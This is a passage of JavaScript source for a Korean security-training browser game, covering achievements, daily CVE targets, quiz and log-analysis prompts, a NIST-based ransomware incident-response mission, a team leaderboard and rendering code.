  ['quiz50', '보안 박사', '누적 퀴즈 정답 50', () => stats.quizRight >= 50],
  ['log5', '로그 탐정', '한 판에 로그 분석 정답 5', () => game.logRight >= 5],
  ['bases', '전 거점 탈환', '한 판에 거점 6곳 확보', () => game.bases.length > 0 && game.bases.every((b) => b.owner === 'ally')],
  ['zero', '제로데이 헌터', '제로데이 격파', () => !!codexSeen['zero:0day']],
  ['gijo', 'GIJO ASTER 가동', 'GIJO 아이템 사용', () => game.gijoUsed],
  ['office', '칼퇴 수호자', '직장 스트레스 몹 누적 10', () => stats.officeKo >= 10],
  ['daily', '오늘의 CVE', '오늘의 CVE 격파', () => game.dailyDone],
  ['weapons', '장비 수집가', '무기 6종 전부 해금', () => WEAPONS.every(isUnlocked)],
  ['codex', '보안 도감 완성', '도감 전부 수집', () => codexCount('all') >= codexList().length],
  ['ir', '침해사고 대응 수료', '침해사고 대응 훈련 완료', () => stats.irClear >= 1],
];
const achGot = store.get('ach', {});
function checkAchievements() {
  if (game.state !== 'play') return;
  for (const [id, name, desc, f] of ACHS) {
    if (achGot[id]) continue;
    let ok = false; try { ok = f(); } catch (e) { /* 무시 */ }
    if (ok) { achGot[id] = Date.now(); store.set('ach', achGot); game.achToasts.push({ name, desc, t: 0 }); game.achNew.push(name); audio.levelup(); }
  }
}

// ── 오늘의 CVE (날짜별로 첫 적장이 정해짐) ──
const todayKey = () => { const d = new Date(); return d.getFullYear() * 10000 + (d.getMonth() + 1) * 100 + d.getDate(); };
// 월간 신규 CVE(KEV 팩) 포함 여부 — 타이틀 메뉴에서 ON/OFF (기본 ON)
const newCveOn = () => settings.newCve !== false;
const cveList = () => (newCveOn() ? CT.cves : CT.cves.filter((c) => !c.kev));
const packMonth = () => CT.cves.reduce((m, c) => (c.month && c.month > m ? c.month : m), '');
const dailyIdx = () => todayKey() % cveList().length;
const latestMonth = () => cveList().reduce((m, c) => (c.month && c.month > m ? c.month : m), '');
function buildCveOrder() { // 오늘의 CVE → 이달의 신규(KEV) → 나머지
  const d = dailyIdx(), lm = latestMonth();
  const L = cveList();
  const idx = L.map((_, i) => i).filter((i) => i !== d);
  const fresh = lm ? idx.filter((i) => L[i].month === lm) : [];
  const rest = idx.filter((i) => !fresh.includes(i));
  return [d, ...fresh.sort(() => Math.random() - 0.5), ...rest.sort(() => Math.random() - 0.5)];
}

// ── 직장 스트레스 엘리트 몹 ──
function spawnOffice(n) {
  const list = CT.officeMobs || [];
  if (!list.length) return;
  for (let i = 0; i < n; i++) {
    const info = pick(list), a = Math.random() * TAU;
    const e = makeEnemy('office', player.x + Math.cos(a) * 560, player.y + Math.sin(a) * 560);
    e.name = info.name; e.info = info; e.named = true;
    floatText(e.x, e.y - 60, `“${info.taunt}”`, '#ffe082', 16, { life: 2.2, vy: -20, important: true });
  }
  msg(`[주의] 직장 스트레스 출현: ${list.length ? '퇴근을 방해하는 존재들' : ''}`, '#ffca28');
}

// ── 보안 점검 요청서 (📋): 주우면 문제은행 퀴즈 ──
function spawnInspect() {
  if (!settings.quiz || !(CT.bank && CT.bank.length) || game.items.some((it) => it.kind === 'inspect')) return;
  const a = Math.random() * TAU;
  dropItem('inspect', clamp(player.x + Math.cos(a) * 380, 80, WORLD.w - 80), clamp(player.y + Math.sin(a) * 380, 80, WORLD.h - 80));
  msg('[점검] 보안 점검 요청서 도착 📋 — 주워서 풀면 패치 버프!', '#90caf9');
}
function openBankQuiz() {
  const item = pickWeighted(CT.bank, (x) => 'bank:' + x.q);
  openQuiz({ kind: 'bank', quiz: item, qid: 'bank:' + item.q, tag: item.tag, level: item.level,
    onResult: (ok) => { if (ok) { player.patchT = 20; player.term = Math.min(100, player.term + 40); } } });
}

// ── 로그 분석: 적장·보스 HP 50%에서 실제 로그 판독 → 정답이면 그로기 ──
function openLogQuiz(target, onDone) {
  if (!(CT.logs && CT.logs.length)) { if (onDone) onDone(false); return; }
  const item = pickWeighted(CT.logs, (x) => 'log:' + x.log);
  openQuiz({ kind: 'log', log: item.log, level: item.level, qid: 'log:' + item.log,
    quiz: { q: '이 로그가 보여주는 것은?', choices: item.choices, answer: item.answerIndex, explain: item.explain },
    onResult: (ok) => {
      if (ok) game.logRight++;
      if (target && !target.dead && ok) { target.groggyT = 6; floatText(target.x, target.y - 90, '분석 성공 — 그로기!', '#69f0ae', 26, { life: 1.6, bold: true, important: true }); }
      if (onDone) onDone(ok);
    } });
}

// ═════════════════════ 침해사고 대응 훈련 (랜섬웨어 · NIST SP 800-61) ═════════════════════
const MISSION_DEFAULT = {
  title: '랜섬웨어 비상 대응 훈련',
  stages: [
    { phase: '준비', name: '비상 백업 확보', brief: '확산 전 오프라인 백업을 안전 금고로 옮겨라.', objective: '오프라인 백업을 금고로 운반', action: 'carry', lesson: '3-2-1 백업 원칙에 따라 오프라인 백업을 유지하고 대응 플레이북을 점검한다.', mistake: '백업을 사내망에 상시 연결해 백업까지 암호화된다.' },
    { phase: '탐지·분석', name: '최초 침투 판별', brief: '로그를 대조해 침투 경로를 찾아라.', objective: '로그 3건 분석', action: 'log', lesson: '타임라인과 IoC를 교차 검증해 최초 침투 벡터와 영향 범위를 확정한다.', mistake: '초기 경보를 오탐으로 무시한다.' },
    { phase: '격리', name: '감염망 긴급 격리', brief: '감염 PC를 네트워크에서 차단하라.', objective: '격리 명령어 입력', action: 'type', lesson: '네트워크는 분리하되 전원은 끄지 않아 메모리 증거를 보존한다.', mistake: '전원을 뽑아 메모리 증거를 날린다.' },
    { phase: '제거', name: '잔존 위협 소탕', brief: '숨은 C2 비콘과 백도어를 제거하라.', objective: 'C2 비콘·백도어 처치', action: 'kill', lesson: '지속성 메커니즘과 탈취 계정까지 함께 제거한다.', mistake: '랜섬웨어 파일만 지우고 백도어를 방치한다.' },
    { phase: '복구', name: '암호화 본체 격파', brief: '랜섬웨어 본체를 격파하라.', objective: '랜섬웨어 본체 격파', action: 'boss', lesson: '감염 이전 시점의 검증된 백업으로 순차 복구한다.', mistake: '감염된 최근 백업으로 복원한다.' },
    { phase: '사후 활동', name: '증거 보전과 회고', brief: '보고 완료까지 관제 센터를 사수하라.', objective: '관제 구역 사수', action: 'hold', lesson: '타임라인과 근본 원인을 문서화하고 탐지 룰을 보완한다.', mistake: '복구 후 원인 분석을 생략한다.' },
  ],
  reportChecklist: ['사고 개요·타임라인', '최초 침투 경로·근본 원인', '영향 범위·피해 현황', '격리·제거·복구 조치', 'IoC·포렌식 증거', '재발 방지 대책'],
};
const MISSION = (CT.mission && CT.mission.stages && CT.mission.stages.length >= 4) ? CT.mission : MISSION_DEFAULT;
const MISSION_CMD = { cmd: 'iptables -I FORWARD -s 10.0.3.15 -j DROP', desc: '감염 PC(10.0.3.15)의 내부망 통신을 게이트웨이에서 차단 — 전원은 끄지 않는다' };
function startStage(i) {
  const M = game.mission; M.stage = i; M.prog = 0; M.t = 0; M.wait = 0; M.carrying = false; M.boss = null; M.logLeft = 0;
  const s = MISSION.stages[i];
  game.missionMarker = null;
  banner(`STAGE ${i + 1} · ${s.name}`, `[${s.phase}] ${s.brief}`, '#80deea', 4, 52);
  msg(`[훈련] 목표: ${s.objective}`, '#80deea');
  switch (s.action) {
    case 'carry': {
      M.from = { x: HQ.x - 900, y: HQ.y + 520 }; M.to = { x: HQ.x + 760, y: HQ.y - 470 };
      game.items = game.items.filter((it) => it.kind !== 'backup');
      dropItem('backup', M.from.x, M.from.y);
      game.missionMarker = { x: M.from.x, y: M.from.y, r: 70, color: '#26c6da', label: '오프라인 백업' };
      break;
    }
    case 'log': M.need = 3; M.logLeft = 3; M.wait = 2.5; break;
    case 'type': M.wait = 2.5; break;
    case 'kill': M.need = 30; break;
    case 'boss': {
      const a = Math.random() * TAU;
      const b = makeEnemy('officer', player.x + Math.cos(a) * 600, player.y + Math.sin(a) * 600);
      b.name = '랜섬웨어 암호화 본체'; b.title = '훈련용 위협 · 파일 암호화 중'; b.missionBoss = true;
      b.hp = b.maxhp = ETYPES.officer.hp * 2.2; M.boss = b; audio.alarm();
      break;
    }
    case 'hold': M.need = 30; game.missionMarker = { x: HQ.x, y: HQ.y, r: 230, color: '#69f0ae', label: '관제 센터 사수' }; break;
  }
}
function stageClear() {
  const M = game.mission, s = MISSION.stages[M.stage];
  audio.capture(); screenFlash('#80deea', 0.4); addShake(10); game.slowT = 0.6;
  banner('STAGE CLEAR', `${s.name} — 다음 단계 준비`, '#69f0ae', 2.6, 60);
  game.cardToast = { entry: { kind: 'lesson', id: 'ir:' + M.stage, data: { name: s.name, cat: s.phase, summary: s.lesson, defense: ['흔한 실수 — ' + s.mistake] } }, t: 0, dur: 9 };
  game.missionMarker = null;
  if (M.stage + 1 >= MISSION.stages.length) { M.done = true; stats.irClear++; store.set('stats', stats); checkAchievements(); game.winT = 3; }
  else { M.next = 4; M.stage = -M.stage - 1; } // 4초 뒤 다음 스테이지 (음수 = 전환 대기)
}
function updateMission(dt) {
  const M = game.mission; if (!M || M.done) return;
  if (M.stage < 0) { M.next -= dt; if (M.next <= 0) startStage(-M.stage); return; }
  const s = MISSION.stages[M.stage]; M.t += dt;
  switch (s.action) {
    case 'carry': {
      const it = game.items.find((x) => x.kind === 'backup');
      if (!M.carrying && !it) { dropItem('backup', M.from.x, M.from.y); }
      if (M.carrying) {
        game.missionMarker = { x: M.to.x, y: M.to.y, r: 120, color: '#69f0ae', label: '안전 금고' };
        if (Math.hypot(player.x - M.to.x, player.y - M.to.y) < 120) { M.prog = 1; stageClear(); }
      }
      break;
    }
    case 'log':
      if (M.logLeft > 0 && !game.overlay) { M.wait -= dt; if (M.wait <= 0) { M.logLeft--; M.wait = 2; openLogQuiz(null, () => { M.prog++; if (M.prog >= M.need) stageClear(); }); } }
      break;
    case 'type':
      if (!game.typing && !M.typed) { M.wait -= dt; if (M.wait <= 0) { M.wait = 3; startTyping(MISSION_CMD, true); } }
      break;
    case 'kill': if (M.prog >= M.need) stageClear(); break;
    case 'boss': if (M.boss && M.boss.dead) stageClear(); break;
    case 'hold': {
      const inside = Math.hypot(player.x - HQ.x, player.y - HQ.y) < 230;
      if (inside) M.prog += dt;
      if (M.prog >= M.need) stageClear();
      break;
    }
  }
}
const missionKillTypes = new Set(['botnet', 'rootkit', 'trojan']);

// ── 메뉴 ──
const LEVELS = ['입문', '실무', '심화'];
const SWITCHES = [['blue', '청축 (찰칵찰칵)'], ['brown', '갈축 (도각도각)'], ['red', '적축 (스윽 톡)']];

// ───────────────────────── 타이틀 / 결과 ─────────────────────────

// ═════════════════════ 보안팀 랭킹 (공유 페이지에서만: claude db + user) ═════════════════════
// 각자 scores/<내 id> 문서 하나에 최고 기록을 저장. 이름은 저장하지 않고 표시할 때 조회한다.
const team = { db: null, user: null, uid: null, docs: [], names: {}, status: 'local', tab: 0, saveMsg: '', saving: false };
const RANK_TABS = [
  { key: 'score', label: '종합 점수', unit: '점' },
  { key: 'ko', label: '최다 KO', unit: 'KO' },
  { key: 'learned', label: '보안 도감', unit: '개' },
  { key: 'quizRight', label: '퀴즈 정답', unit: '문제' },
];
(async function initTeam() {
  if (!window.claude || typeof window.claude.use !== 'function') return; // 로컬 파일 실행: 랭킹 없이 플레이
  team.status = 'connecting';
  try {
    const [db, user] = await Promise.all([window.claude.use('db'), window.claude.use('user')]);
    if (!db) { team.status = 'local'; return; }
    team.db = db; team.user = user;
    team.uid = user ? await user.id() : null;
    const timer = setTimeout(() => { if (team.status === 'connecting') team.status = 'slow'; }, 10000);
    db.collection('scores').onSnapshot(async (snap) => {
      team.docs = snap.docs.filter((d) => d.exists).map((d) => ({ id: d.id, ...d.data() }));
      if (!snap.metadata.fromCache) { clearTimeout(timer); team.status = 'ready'; }
      else if (team.status === 'connecting') team.status = 'ready';
      if (user && team.docs.length) {
        const ps = await user.profiles(team.docs.map((d) => d.id));
        for (const id in ps) team.names[id] = ps[id].name;
      }
    }, (err) => { clearTimeout(timer); team.status = 'error'; team.err = err && err.code; });
  } catch (e) { team.status = 'local'; }
})();
const teamName = (id) => (id === team.uid ? '나' : (team.names[id] || '팀원'));
function teamSorted(key) { return team.docs.filter((d) => typeof d[key] === 'number').slice().sort((a, b) => b[key] - a[key]); }
function myTeamRank(key) { const i = teamSorted(key).findIndex((d) => d.id === team.uid); return i < 0 ? null : i + 1; }
async function submitScore(rec) {
  if (!team.db) return;
  if (!team.uid) { team.saveMsg = '로그인한 팀원만 랭킹에 기록됩니다'; return; }
  if (team.saving) return;
  team.saving = true; team.saveMsg = '팀 랭킹에 기록 중…';
  const ref = team.db.doc('scores/' + team.uid);
  try {
    const cur = await ref.get();
    const o = cur.exists ? cur.data() : {};
    const num = (v) => (typeof v === 'number' && isFinite(v) ? v : 0);
    const next = {
      score: Math.max(num(o.score), rec.score), ko: Math.max(num(o.ko), rec.ko), combo: Math.max(num(o.combo), rec.combo),
      learned: Math.max(num(o.learned), rec.learned), quizRight: num(o.quizRight) + rec.quizRight,
      runs: num(o.runs) + 1, irClear: num(o.irClear) + (rec.ir ? 1 : 0), updatedAt: new Date().toISOString(),
    };
    await ref.set(next);
    const r = myTeamRank('score');
    team.saveMsg = rec.score >= num(o.score) && cur.exists ? '🏅 개인 최고 기록 갱신! 팀 랭킹에 저장했습니다' : '팀 랭킹에 저장했습니다';
    if (r) team.saveMsg += ` · 현재 종합 ${r}위`;
  } catch (e) {
    team.saveMsg = e && e.code === 'invalid_argument' ? '보기 전용 권한이라 기록할 수 없어요 (공유 시 참여자 권한 필요)'
      : e && e.code === 'quota_exceeded' ? '랭킹 저장 공간이 가득 찼어요' : '랭킹 기록 실패 — 다음 판에 다시 시도합니다';
  }
  team.saving = false;
}
function drawRankScreen() {
  ctx.textAlign = 'center'; ctx.font = `46px ${FONT_BIG}`; ctx.fillStyle = '#ffd740'; ctx.fillText('🏅 보안팀 랭킹', 0, 80);
  ctx.font = `14px ${FONT}`; ctx.fillStyle = '#90a4ae'; ctx.fillText('←→ 순위 기준 변경 · ESC/ENTER 돌아가기 · 게임이 끝나면 내 최고 기록이 자동 저장됩니다', 0, 106);
  RANK_TABS.forEach((tb, i) => {
    const x = -330 + i * 165, sel = i === team.tab;
    ctx.fillStyle = sel ? 'rgba(255,215,64,0.2)' : 'rgba(255,255,255,0.05)'; rr(ctx, x - 75, 126, 150, 34, 8); ctx.fill();
    if (sel) { ctx.strokeStyle = '#ffd740'; ctx.lineWidth = 2; rr(ctx, x - 75, 126, 150, 34, 8); ctx.stroke(); }
    hitT(titleScale, W / 2, 0, x - 75, 126, 150, 34, () => { team.tab = i; });
    ctx.font = `16px ${FONT_BIG}`; ctx.fillStyle = sel ? '#fff' : '#90a4ae'; ctx.fillText(tb.label, x, 149);
  });
  const tb = RANK_TABS[team.tab];
  const status = { local: '이 화면은 로컬 실행 중입니다. 공유 페이지(링크)로 열면 팀 랭킹이 켜집니다.', connecting: '랭킹 불러오는 중…', slow: '랭킹 서버 응답이 늦어요. 잠시 후 자동으로 표시됩니다.', error: '랭킹을 불러오지 못했어요. 페이지를 다시 열어 주세요.' }[team.status];
  if (status) { ctx.font = `17px ${FONT}`; ctx.fillStyle = '#b0bec5'; ctx.fillText(status, 0, 300); return; }
  const rows = teamSorted(tb.key);
  if (!rows.length) { ctx.font = `17px ${FONT}`; ctx.fillStyle = '#b0bec5'; ctx.fillText('아직 기록이 없어요. 한 판 플레이하면 첫 기록이 올라갑니다!', 0, 300); return; }
  rows.slice(0, 12).forEach((d, i) => {
    const y = 200 + i * 40, me = d.id === team.uid;
    ctx.fillStyle = me ? 'rgba(0,229,255,0.16)' : i % 2 ? 'rgba(255,255,255,0.03)' : 'rgba(255,255,255,0.06)'; rr(ctx, -360, y - 26, 720, 34, 6); ctx.fill();
    ctx.textAlign = 'left'; ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = i === 0 ? '#ffd740' : i === 1 ? '#cfd8dc' : i === 2 ? '#ffab91' : '#78909c';
    ctx.fillText(`${i + 1}`, -340, y);
    ctx.font = `bold 17px ${FONT}`; ctx.fillStyle = me ? '#80deea' : '#eceff1'; ctx.fillText(teamName(d.id), -290, y);
    ctx.font = `13px ${FONT}`; ctx.fillStyle = '#78909c'; ctx.fillText(`${d.runs || 0}판 · 침해사고 훈련 ${d.irClear || 0}회`, -60, y);
    ctx.textAlign = 'right'; ctx.font = `20px ${FONT_BIG}`; ctx.fillStyle = '#fff'; ctx.fillText(`${fmt(d[tb.key])} ${tb.unit}`, 340, y);
  });
  const mr = myTeamRank(tb.key);
  ctx.textAlign = 'center'; ctx.font = `bold 15px ${FONT}`; ctx.fillStyle = '#80deea';
  ctx.fillText(mr ? `내 순위: ${mr}위 / ${rows.length}명` : team.uid ? '내 기록이 아직 없어요' : '로그인하면 내 기록이 올라갑니다', 0, 700);
}

function cycleQuiz() { // 적당히 → 자주 → OFF → 적당히
  if (!settings.quiz) { settings.quiz = true; settings.quizFreq = 'normal'; }
  else if ((settings.quizFreq || 'normal') === 'normal') settings.quizFreq = 'often';
  else settings.quiz = false;
  store.set('settings', settings);
}
const MENU = () => [...DIFFS.map((d) => ({ kind: 'diff', d })), { kind: 'weapon' }, { kind: 'level' }, { kind: 'switch' }, { kind: 'quiz' }, { kind: 'codex' }, { kind: 'ach' }, { kind: 'rank' }, { kind: 'cvepack' }];
function updateTitle() {
  if (game.menuMode === 'codex') {
    const all = codexList();
    if (wasPressed('ArrowUp', 'KeyW')) game.codexIdx = (game.codexIdx + all.length - 1) % all.length;
    if (wasPressed('ArrowDown', 'KeyS')) game.codexIdx = (game.codexIdx + 1) % all.length;
    if (wasPressed('Escape', 'Backspace', 'Enter')) game.menuMode = 'main';
    return;
  }
  if (game.menuMode === 'ach') { if (wasPressed('Escape', 'Backspace', 'Enter', 'Space')) game.menuMode = 'main'; return; }
  if (game.menuMode === 'rank') {
    if (wasPressed('ArrowRight', 'KeyD')) { team.tab = (team.tab + 1) % RANK_TABS.length; audio.clack(); }
    if (wasPressed('ArrowLeft', 'KeyA')) { team.tab = (team.tab + RANK_TABS.length - 1) % RANK_TABS.length; audio.clack(); }
    if (wasPressed('Escape', 'Backspace', 'Enter', 'Space')) game.menuMode = 'main';
    return;
  }
  const m = MENU(), nd = DIFFS.length;
  if (wasPressed('ArrowUp', 'KeyW')) { game.menuIdx = (game.menuIdx + m.length - 1) % m.length; audio.clack(); }
  if (wasPressed('ArrowDown', 'KeyS')) { game.menuIdx = (game.menuIdx + 1) % m.length; audio.clack(); }
  if (wasPressed('ArrowRight', 'KeyD') && game.menuIdx < nd) { game.menuIdx = Math.min(m.length - 1, game.menuIdx + nd); audio.clack(); }
  if (wasPressed('ArrowLeft', 'KeyA') && game.menuIdx >= nd) { game.menuIdx = Math.min(nd - 1, game.menuIdx - nd); audio.clack(); }
  for (let i = 0; i < nd; i++) if (wasPressed('Digit' + (i + 1))) { game.menuIdx = i; audio.clack(true); newGame(DIFFS[i]); return; }
  if (wasPressed('KeyQ')) { cycleQuiz(); audio.clack(); }
  if (wasPressed('Enter', 'Space', 'KeyJ')) {
    const it = m[game.menuIdx]; audio.clack(true);
    if (it.kind === 'diff') newGame(it.d);
    else if (it.kind === 'quiz') cycleQuiz();
    else if (it.kind === 'weapon') {
      const cur = WEAPONS.indexOf(curWeapon());
      for (let k = 1; k <= WEAPONS.length; k++) { const w = WEAPONS[(cur + k) % WEAPONS.length]; if (isUnlocked(w)) { settings.weapon = w.id; break; } }
      store.set('settings', settings);
    }
    else if (it.kind === 'level') { settings.level = ((settings.level || 1) % 3) + 1; store.set('settings', settings); }
    else if (it.kind === 'switch') { const i = SWITCHES.findIndex((x) => x[0] === (settings.sw || 'blue')); settings.sw = SWITCHES[(i + 1) % SWITCHES.length][0]; store.set('settings', settings); for (let k = 0; k < 4; k++) setTimeout(() => audio.clack(k === 3), k * 90); }
    else if (it.kind === 'ach') game.menuMode = 'ach';
    else if (it.kind === 'rank') game.menuMode = 'rank';
    else if (it.kind === 'cvepack') { settings.newCve = !newCveOn(); store.set('settings', settings); }
    else { game.menuMode = 'codex'; game.codexIdx = 0; }
  }
}
function codexList() {
  return [
    ...CT.bases.map((b) => ({ id: 'base:' + b.id, kind: 'base', data: b })),
    ...cveList().map((c) => ({ id: 'cve:' + c.cve, kind: 'cve', data: c })),
    ...Object.entries(MALWARE_INFO).map(([k, m]) => ({ id: 'mal:' + k, kind: 'malware', data: m })),
  ];
}
function endGame(win) {
  if (game.state !== 'play') return;
  game.state = 'result';
  audio.stopBgm(); audio.intensity = 0;
  const comments = CT.resultComments.slice().sort((a, b) => a.min - b.min).filter((r) => game.stress >= r.min);
  const cm = comments.length ? pick(comments[comments.length - 1].lines) : '';
  const score = game.ko + game.maxCombo * 2 + game.quizRight * 50 + (win ? 1000 : 0);
  const rank = score > 3000 ? 'S' : score > 1800 ? 'A' : score > 900 ? 'B' : 'C';
  game.result = { win, comment: cm, rank, t: 0, newBest: game.ko > bestRec.ko };
  team.saveMsg = '';
  submitScore({ score, ko: game.ko, combo: game.maxCombo, learned: codexCount('all'), quizRight: game.quizRight, ir: !!(win && game.mission) });
  if (game.ko > bestRec.ko || game.maxCombo > bestRec.combo) { bestRec = { ko: Math.max(game.ko, bestRec.ko), combo: Math.max(game.maxCombo, bestRec.combo) }; store.set('best', bestRec); }
}
function updateResult(dt) {
  game.result.t += dt;
  if (game.result.t < 1) return;
  if (wasPressed('KeyR')) newGame(game.diff);
  else if (wasPressed('Enter', 'Escape', 'Space')) { game.state = 'title'; game.menuMode = 'main'; }
}

// ───────────────────────── 렌더 ─────────────────────────
const use3D = () => !!(window.R3D && window.R3D.enabled);
function viewRadius() { return use3D() ? 1050 / game.zoom : Math.hypot(W, H) / 2 / (VS * game.zoom); }
function render() {
  touchHits = [];
  ctx.setTransform(DPR, 0, 0, DPR, 0, 0);
  // 퀴즈·일시정지·결과·타이틀에선 마우스 잠금 해제
  if (document.pointerLockElement && (game.state !== 'play' || game.overlay || game.typing)) document.exitPointerLock();
  const three = use3D() && game.state !== 'title';
  if (window.R3D) window.R3D.show(three);
  if (three) {
    ctx.clearRect(0, 0, W, H);
    window.R3D.render();
    drawOverlay3D();
  } else {
    ctx.fillStyle = '#05070d'; ctx.fillRect(0, 0, W, H);
    if (game.state === 'title') { drawTitle(); if (game.menuMode === 'main') drawInstallHint(); return; }
    drawWorld();
  }
  drawHUD();
  if (touch.on && game.state === 'play' && !game.overlay && !game.typing) drawTouchUI();
  if (game.typing) drawTyping();
  drawBanners();
  if (game.cardToast) drawCardToast();
  if (game.overlay) drawOverlay();
  if (game.state === 'pause') drawPause();
  if (game.state === 'result') drawResult();
  if (imeWarnT > 0) drawImeWarn();
}

function drawWorld() {
  const S = VS * game.zoom;
  const ox = W / 2 - cam.x * S + game.sx, oy = H / 2 - cam.y * S + game.sy;
  ctx.setTransform(DPR * S, 0, 0, DPR * S, DPR * ox, DPR * oy);
  const vx0 = cam.x - W / 2 / S - 40, vy0 = cam.y - H / 2 / S - 40, vw = W / S + 80, vh = H / S + 80;
  ctx.fillStyle = floorPat; ctx.fillRect(vx0, vy0, vw, vh);
  // 월드 경계 (방화벽)
  ctx.strokeStyle = '#ff1744'; ctx.lineWidth = 6; ctx.setLineDash([24, 14]); ctx.strokeRect(0, 0, WORLD.w, WORLD.h); ctx.setLineDash([]);
  ctx.fillStyle = 'rgba(0,0,0,0.6)';
  ctx.fillRect(vx0, vy0, vw, -vy0); ctx.fillRect(vx0, WORLD.h, vw, vh); ctx.fillRect(vx0, 0, -vx0, WORLD.h); ctx.fillRect(WORLD.w, 0, vw, WORLD.h);
  const inView = (x, y, m = 120) => x > vx0 - m && x < vx0 + vw + m && y > vy0 - m && y < vy0 + vh + m;

  // HQ
  ctx.save(); ctx.translate(HQ.x, HQ.y);
  ctx.strokeStyle = game.boss ? 'rgba(255,23,68,0.6)' : 'rgba(120,144,156,0.35)'; ctx.lineWidth = 4;
  ctx.beginPath(); ctx.arc(0, 0, 170 + Math.sin(game.titleT * 2) * 6, 0, TAU); ctx.stroke();
  ctx.font = `20px ${FONT_BIG}`; ctx.textAlign = 'center'; ctx.fillStyle = game.boss ? '#ff5252' : '#78909c'; ctx.fillText('C&C 서버', 0, -185);
  ctx.restore();

  // 거점
  for (const b of game.bases) {
    if (!inView(b.x, b.y, b.r + 60)) continue;
    const en = b.owner === 'enemy', c = en ? '255,64,80' : '0,229,255';
    b.pulse += 0.02;
    ctx.save(); ctx.translate(b.x, b.y);
    ctx.beginPath(); for (let i = 0; i < 6; i++) { const a = i / 6 * TAU + Math.PI / 6; ctx.lineTo(Math.cos(a) * b.r, Math.sin(a) * b.r); } ctx.closePath();
    ctx.fillStyle = `rgba(${c},${0.07 + Math.sin(b.pulse) * 0.03})`; ctx.fill();
    ctx.strokeStyle = `rgba(${c},0.7)`; ctx.lineWidth = 4; ctx.stroke();
    ctx.font = `26px ${FONT_BIG}`; ctx.textAlign = 'center'; ctx.fillStyle = `rgba(${c},0.95)`;
    ctx.fillText(b.info.base, 0, -b.r - 18);
    ctx.font = `13px ${FONT_MONO}`; ctx.fillStyle = `rgba(${c},0.7)`; ctx.fillText(b.info.owasp + ' · ' + (b.info.cwe || ''), 0, -b.r + 2);
    ctx.font = `bold 15px ${FONT}`; ctx.fillText(en ? '▲ 위협 점령 중' : '✔ 보안 확보', 0, b.r + 26);
    ctx.restore();
  }
  // 서버랙 기둥 (2D)
  for (const o of game.obstacles) {
    if (!inView(o.x, o.y)) continue;
    ctx.fillStyle = '#1c2433'; ctx.fillRect(o.x - o.r, o.y - o.r - o.h * 10, o.r * 2, o.r * 2 + o.h * 10);
    ctx.fillStyle = '#2b3850'; ctx.fillRect(o.x - o.r, o.y - o.r - o.h * 10, o.r * 2, 14);
    for (let i = 0; i < 4; i++) { ctx.fillStyle = Math.sin(game.titleT * 3 + i + o.x) > 0 ? '#00e676' : '#0b3d1f'; ctx.fillRect(o.x - o.r + 10 + i * 14, o.y - o.h * 10 + 10, 6, 4); }
  }
  // 복셀 파편 (2D)
  for (const c of game.cubes) {
    if (!inView(c.x, c.y)) continue;
    ctx.globalAlpha = Math.min(1, c.life * 2); ctx.fillStyle = c.color;
    ctx.fillRect(c.x - c.size / 2, c.y - c.h - c.size / 2, c.size, c.size);
  }
  ctx.globalAlpha = 1;
  if (game.missionMarker) {
    const mk = game.missionMarker;
    ctx.strokeStyle = mk.color; ctx.lineWidth = 5; ctx.setLineDash([16, 10]); ctx.beginPath(); ctx.arc(mk.x, mk.y, mk.r, 0, TAU); ctx.stroke(); ctx.setLineDash([]);
    ctx.font = `20px ${FONT_BIG}`; ctx.textAlign = 'center'; ctx.fillStyle = mk.color; ctx.fillText(mk.label, mk.x, mk.y - mk.r - 12);
  }
  // 텔레그래프 (공격 예고)
  for (const t of game.tele) {
    const k = t.t / t.dur;
    if (t.line) {
      ctx.save(); ctx.translate(t.x, t.y); ctx.rotate(t.ang);
      ctx.fillStyle = `rgba(255,23,68,${0.15 + k * 0.25})`; ctx.fillRect(0, -50, t.len, 100);
      ctx.fillStyle = 'rgba(255,23,68,0.5)'; ctx.fillRect(0, -50, t.len * k, 100); ctx.restore();
    } else {
      ctx.fillStyle = `rgba(255,23,68,${0.1 + k * 0.15})`; ctx.beginPath(); ctx.arc(t.x, t.y, t.r, 0, TAU); ctx.fill();
      ctx.strokeStyle = 'rgba(255,82,82,0.9)'; ctx.lineWidth = 3; ctx.beginPath(); ctx.arc(t.x, t.y, t.r * k, 0, TAU); ctx.stroke();
      ctx.beginPath(); ctx.arc(t.x, t.y, t.r, 0, TAU); ctx.stroke();
    }
  }
  // 아이템
  for (const it of game.items) {
    if (!inView(it.x, it.y)) continue;
    const y = it.y - 10 + Math.sin(game.titleT * 4 + it.bob) * 5;
    const blink = it.t > itemLife(it) - 4 && Math.sin(it.t * 20) > 0;
    if (blink) continue;
    if (it.kind === 'gijo') { drawGijoToken(it.x, y, 1); continue; }
    ctx.fillStyle = 'rgba(0,0,0,0.35)'; ctx.beginPath(); ctx.ellipse(it.x, it.y + 8, 14, 5, 0, 0, TAU); ctx.fill();
    ctx.font = `28px ${FONT}`; ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
    ctx.shadowColor = it.kind === 'coffee' ? '#ffab91' : it.kind === 'energy' ? '#ffff00' : '#69f0ae'; ctx.shadowBlur = 16;
    ctx.fillText({ coffee: '☕', energy: '⚡', patch: '🛡', inspect: '📋', backup: '💾' }[it.kind] || '?', it.x, y);
    ctx.shadowBlur = 0; ctx.textBaseline = 'alphabetic';
  }
  // 그림자
  ctx.fillStyle = 'rgba(0,0,0,0.35)';
  for (const e of game.enemies) { if (!inView(e.x, e.y)) continue; const s = 1 / (1 + e.z / 200); ctx.beginPath(); ctx.ellipse(e.x, e.y + e.r * 0.7, e.r * s, e.r * 0.35 * s, 0, 0, TAU); ctx.fill(); }
  ctx.beginPath(); ctx.ellipse(player.x, player.y + 18, 22 / (1 + player.z / 150), 7, 0, 0, TAU); ctx.fill();

  // 엔티티 y정렬
  const list = [];
  for (const e of game.enemies) if (inView(e.x, e.y)) list.push(e);
  list.push(player);
  list.sort((a, b) => a.y - b.y);
  for (const o of list) { if (o === player) drawPlayer(); else drawEnemy(o); }
  // 시체
  for (const c of game.corpses) {
    if (!inView(c.x, c.y)) continue;
    const s = SPR[c.type]; const k = c.life / c.max;
    ctx.save(); ctx.globalAlpha = Math.min(1, k * 1.6); ctx.translate(c.x, c.y - c.z); ctx.rotate(c.rot); ctx.scale(0.6 + k * 0.4, 0.6 + k * 0.4);
    if (s) ctx.drawImage(k > 0.75 ? s.w : s.n, -s.n.width / 4, -s.n.height / 4, s.n.width / 2, s.n.height / 2);
    else { ctx.fillStyle = '#ff0040'; ctx.beginPath(); ctx.arc(0, 0, c.r, 0, TAU); ctx.fill(); }
